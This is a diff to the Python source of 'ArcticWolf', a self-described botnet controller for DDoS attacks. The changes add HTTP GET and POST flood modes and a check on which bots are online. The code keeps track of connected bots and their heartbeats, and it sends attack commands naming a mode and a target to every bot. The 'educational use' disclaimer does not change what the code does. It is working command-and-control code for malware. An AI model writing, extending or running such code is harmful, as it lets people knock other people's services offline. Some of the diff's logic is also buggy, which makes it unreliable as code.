@@ -9,15 +9,18 @@ buffsize = 512 #数据包大小
 datasock_list = {}  # 机器字典  {No:socket}
 last_Heartbeat = {}  # 记录机器的上次心跳时间
 ddos_attack_list = [] # 记录ddos的攻击列表
-mode_list = ['httpflood', 'udpflood']
+mode_list = ['httpGETflood', 'httpPOSTflood', 'udpflood']
 # 带颜色打印
 def print_error(str : str):
     print('\033[0;31m' + '[-] ' + str + '\033[0m')
-def print_good(str : str, add_symbol=True):
+def print_good(str : str, add_symbol=True, line_break=False):
+    print_str = '\033[0;36m' + str + '\033[0m'
     if add_symbol:
-        print('\033[0;36m' + '[+] ' + str + '\033[0m')
-    else:
-        print('\033[0;36m' + str + '\033[0m')
+        print_str = '\033[0;36m' + '[+] ' + str + '\033[0m'
+    if line_break:
+        print_str = '\n' + print_str
+    print(print_str)
+    
 def print_warn(str : str):
     print('\033[0;33m' + '[!] ' + str + '\033[0m')
 def print_normal(str : str, add_symbol=True):
@@ -246,7 +249,7 @@ def run():
                     biggest_No = int(No)
             biggest_No += 1
             History_write(f'Bot connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}')
-            print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}")
+            print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}", line_break=True)
             last_Heartbeat[clientsock] = time.time()
             if clientsock not in datasock_list:
                 datasock_list[biggest_No] = clientsock
@@ -258,6 +261,16 @@ def run():
 
 # 发送指令
 def send(com : str):
+    try:
+        No = 1
+        for i in datasock_list.values():
+            i.send('test'.encode('utf8'))
+            No += 1 #测试机器是否在线
+    except:
+        i.close()
+        del datasock_list[No]
+        del last_Heartbeat[No]
+        print_error(f'\nBot No{No} Disconnected\n')
     if com.split('_')[0] == 'attack':
         print_warn(f'doing {com.split("_")[1]} on {com.split("_")[2]}')
         for i in datasock_list.values():
@@ -328,7 +341,7 @@ if __name__ == '__main__':
 
 [ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
 ---------------------------------------------------------------------------
-[Version] : v0.1     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
+[Version] : v0.1.2     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
 
 ===========================================================================
 
